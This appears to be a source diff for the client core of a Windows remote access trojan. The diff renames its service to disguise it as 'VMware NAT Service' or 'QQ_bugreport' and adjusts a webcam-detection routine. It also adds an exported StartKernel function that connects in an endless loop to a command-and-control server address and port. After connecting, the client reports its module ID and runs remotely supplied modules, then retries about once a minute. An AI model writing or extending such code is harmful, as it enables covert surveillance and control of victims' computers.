@@ -14,8 +14,7 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Strmiids.lib") 
 
-#define SERVICE_NAME TEXT("VMware NAT Service")
-
+#define SERVICE_NAME TEXT("QQ_bugreport")
 
 CKernel::CKernel(CClient*pClient) :
 CEventHandler(pClient,KNEL)
@@ -706,8 +705,7 @@ void CKernel::GetCPU(TCHAR CPU[128])
 
 DWORD CKernel::HasCamera()
 {
-	UINT nCam = 0;
-	CoInitialize(NULL);     
+	UINT nCam = 0;   
 	ICreateDevEnum *pCreateDevEnum;                          
 	HRESULT hr = CoCreateInstance(
 		CLSID_SystemDeviceEnum,     
@@ -740,7 +738,7 @@ DWORD CKernel::HasCamera()
 		{
 			VARIANT var;
 			var.vt = VT_BSTR;                                
-			hr = pBag->Read(L"FriendlyName", &var, NULL);
+			hr = pBag->Read(TEXT("FriendlyName"), &var, NULL);
  
 			if (hr == NOERROR){
 				nCam++;
@@ -749,8 +747,7 @@ DWORD CKernel::HasCamera()
 			pBag->Release();                   
 		}
 		pM->Release();                        
-	}
-	CoUninitialize();                    
+	}                 
 	return nCam;
 }
 
@@ -1272,4 +1269,67 @@ void CKernel::OnRunModule(BYTE * lpData, UINT32  Size)
 	
 	//
 	Run(this, module_name, module_entry, lpParams);
+}
+
+extern "C" void __stdcall StartKernel(CONST CHAR * szServerAddress, USHORT Port)
+{
+	WSADATA   wsadata;
+	CIOCP *   iocp = NULL;
+	HANDLE    hEvent = CreateEvent(0, 0, 0, 0);
+	CClient * client = NULL;
+	CKernel * kernel = NULL;
+
+	if (WSAStartup(MAKEWORD(2, 0), &wsadata))
+	{
+		dbg_log("WSAStartup failed with error : %d", WSAGetLastError());
+		exit(1);
+	}
+
+	//COM initialize 
+	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+	if (FAILED(hr))
+	{
+		dbg_log("CoInitializeEx failed with error : %d", GetLastError());
+		exit(1);
+	}
+
+
+	//create iocp.
+	iocp = new CIOCP();
+
+	if (!iocp->Create())
+	{
+		dbg_log("iocp->Create() failed");
+		ExitProcess(-1);
+	}
+
+	//create client socket and kernel handler.
+	client = new CClient;
+	kernel = new CKernel(client);
+
+	while (1)
+	{
+		client->Create();
+		client->Bind(0);
+
+		iocp->AssociateSock(client);
+
+		client->Connect(szServerAddress, Port, NULL, hEvent);
+		WaitForSingleObject(hEvent, INFINITE);
+
+		if (client->IsConnected())
+		{
+			UINT32 ID = kernel->GetModuleID();
+			client->Send((BYTE*)&ID, sizeof(ID));
+			kernel->OnOpen();
+
+			client->Run();
+			kernel->Wait();
+
+			dbg_log("connection close");
+		}
+
+		client->Close();
+		Sleep(61112);
+	}
 }
